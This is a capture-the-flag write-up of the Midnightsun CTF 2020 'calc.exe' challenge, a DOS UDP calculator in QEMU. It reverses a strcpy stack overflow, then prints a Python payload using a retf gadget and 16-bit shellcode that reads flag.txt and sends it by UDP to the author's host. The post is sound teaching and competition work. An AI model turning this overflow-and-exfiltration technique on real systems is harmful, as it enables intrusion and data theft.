---
layout: post
category: Pwn
title: Midnightsun CTF 2020 - calc.exe
tags: 
    - kowu
---

# Challenge Description / Setup

```
During some renovations, we found an ancient computer with this VM hidden behind a wall.
We believe it is the earliest example of networked computation. (QEMU with PCNET network)
```
[Download](/assets/bin/midnight_floppy.img)

So we got a DOS floppy image. The Image contained the following files:
```
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
1991-11-11 05:00:02 .RHS.        33430        33792  IO.SYS
1991-11-11 05:00:02 .RHS.        37394        37888  MSDOS.SYS
1991-11-11 05:00:02 ....A        47845        48128  COMMAND.COM
2020-10-01 20:13:50 ....A        32769        33280  DHCP.EXE
2020-10-01 20:13:50 ....A         6751         7168  PCNTPK.COM
2020-10-01 20:13:50 ....A        55816        56320  calc.exe
2020-10-01 20:13:50 ....A           37          512  flag.txt
2020-10-01 20:13:50 ....A           77          512  AUTOEXEC.BAT
2020-10-03 10:58:54 ....A          247          512  MTCP.CFG
1999-11-17 17:32:02 ....A            0            0  BOOT500
------------------- ----- ------------ ------------  ------------------------
2020-10-03 10:58:54             214366       218112  10 files

```

Autoexec would start DHCP to run a DHCP server, then the challenge "calc.exe" is executed. It turns out that [mTCP](http://www.brutman.com/mTCP/) was used as a TCP stack. Calc.exe would then listen on UDP port 8888 for simple equations of the format `number operand number` and echo the result back (via network).


First I spent some time getting QEMU and NAT working. I have no clue of networking and just followed Instructions at [https://wiki.qemu.org/Documentation/Networking/NAT](https://wiki.qemu.org/Documentation/Networking/NAT). Finally I ended up using the following combination:

`sudo qemu-system-i386 -drive file=floppy.img,if=floppy,format=raw -m 64 -boot a -netdev tap,id=mynet0 -device pcnet,netdev=mynet0 --nographic`

It probably would be way easier (and does not require root) to just forward UDP port 8888, but I did the setup before reversing, and before looking into the provided openvpn conf, where the ports would have been documented.

Server:
```
...
DHCP request sent, attempt 1: Offer received, Acknowledged

Good news everyone!

IPADDR = 192.168.53.76
NETMASK = 255.255.255.0
GATEWAY = 192.168.53.1
NAMESERVER = 192.168.53.1
LEASE_TIME = 3600 seconds

Settings written to 'MTCP.CFG'
Sending [1337 + 9774 = 11111]


```

Client:
```
user@KARCH ~ % nc -u 192.168.53.76 8888
1337+9774
1337 + 9774 = 11111
```

# Reversing / Bug Hunting

I reversed the binary using Ghidra. By comparing characteristic strings in the binary and correlating them with exmaple source from the mTCP project, I could locate the mainloop at `1000:09c1`. From there it was easy to locate the UDP packet handler at `1000:0afa`.

decompiled handler:
```c
void __fastcall_member udp_handler(byte *packet,char *header)

{
  void *unaff_DI;
  void *unaff_SS;
  
  parsepkt((char *)(packet + 0x2a));
  dbg_print_sending((char *)0x2b5,(void *)0x1aa8,(void *)0xbfc);
  sendUDP((uint)(packet + 0x1a),(int)header,0x200,0xbd2,unaff_SS,1);
  Buffer_free(unaff_DI);
  return;
}
```

the bug is an obvious stackoverflow via strcpy in the parsepkt function, a long input would result in a hang:
```c
void __fastcall_member parsepkt(char *input)

{
  char cVar1;
  char *buffer_ptr;
  undefined2 unaff_SS;
  char buffer [20];
  
  strcpy(buffer,input);
  buffer_ptr = buffer;
  while( true ) {
    cVar1 = *buffer_ptr;
    if (cVar1 == '\0') {
      return;
    }
    if ((((cVar1 == '+') || (cVar1 == '-')) || (cVar1 == '*')) || (cVar1 == '/')) break;
    buffer_ptr = buffer_ptr + 1;
  }
  *buffer_ptr = '\0';
  buffer_ptr = buffer_ptr + 1;
  atoi(buffer);
  atoi(buffer_ptr);
  FUN_1000_3a65(0xbfc);
  return;
}
```
Now the presented decompiled source looks quite nice, but for this I had to teach Ghidra some new 16bit calling conventions (like microsoft 16bit fastcall it seems). This worked surprisingly easy, some existing specifications can be modified in `Ghidra/Processors/x86/data/languages/x86-16.cspec`. I think I did't quite get them right, but sufficiently well to understand what's going on. It should be `AX, BX, CX, DX, ES, stack...`, return values in `AX, DX`.

# Debugging

To debug, I attached radare (`r2 -a x86 -b 16 -D gdb gdb://localhost:1234`) / gdb (`gdb -ex "target remote localhost:1234" -ex "set architecture i8086"`) to qemus gdb server (add `-S -s` options), and placed a breakpoint at `b *0x1459b`. I stumbled upon some strange behaviour. The breakpoint was hit, and stepping "worked", but somehow the IP was completely off. It turns out this is because both debuggers don't take care of code segments. I stumbled upon some GDB script at [https://ternet.fr/gdb_real_mode.html], which allowed at least for some more comfortable single stepping in gdb. In r2, i just manually calculated addresses e.g. by `s cs * 16 + eip`.


# Shellcode Execution

Next I found some simple retf ropgadget which allowed me to set ip and cs, so that cs:ip points to the stack (under my control). Shellcode execution :)
```python
# bp di si cx bx ip (0x0a40 = retf) | ip cs | 4X fill | shellcode
r.send(b'+' * 24 + struct.pack(
    '<12H',
    0x1111, 0x2222, 0x3333, 0x4444, 0x5555, 0x0a40,
    0x2710, 0x202e, 0x5858, 0x5858, 0x5858, 0x5858
) + shellcode)
```

# Shellcode

Now it is "easy". I used the 0x21 DOS intterrupt [https://www.beck-ipc.com/api_files/scxxx/dosemu.htm](https://www.beck-ipc.com/api_files/scxxx/dosemu.htm) to open the flag file, and read the flag into memory. Next I prepared the arguments to call the already existing `int8_t Udp::sendUdp( IpAddr_t host, uint16_t srcPort, uint16_t dstPort, uint16_t payloadLen, uint8_t *data, uint8_t preAlloc)` function, to echo back the flag via udp. I filled out all the important arguments with static data (static ip address, 1337 src / dst port), and let wireshark listen for the resulting UDP packet. Less work for me :)

```asm
org 0
bits 16

; open flag.txt
xor ax, ax;
push ax;
push 0x7478;
push 0x742e;
push 0x6761;
push 0x6c66;
mov dx, sp;
xor ax, ax;
mov ah, 0x3d;
int 0x21;

; read file
mov cx, 0x111;
mov bx, ax;
mov dx, 0xbfc;
mov ah, 0x3f;
int 0x21;

; prepare 10.8.10.2
mov al, 10; ; dst ip
mov ah, 2;
push ax;
mov al, 10;
mov ah, 8;
push ax;
mov bp, sp;

xor ax, ax;  ; use buffer
inc ax;
push ax;

push ds; ; buffer
push 0xbd2;

push 0x201; ; length

; jump
push 0x13ab; ;cs
push 0x0b3b; ;ip

mov ax, bp;   ; ptr to 10.8.10.2
mov dx, ds;
mov cx, 1337; ; dst port
mov bx, 1337; ; src port

retf
```

![image](http://blog.redrocket.club/assets/img/calc_wireshark.png)
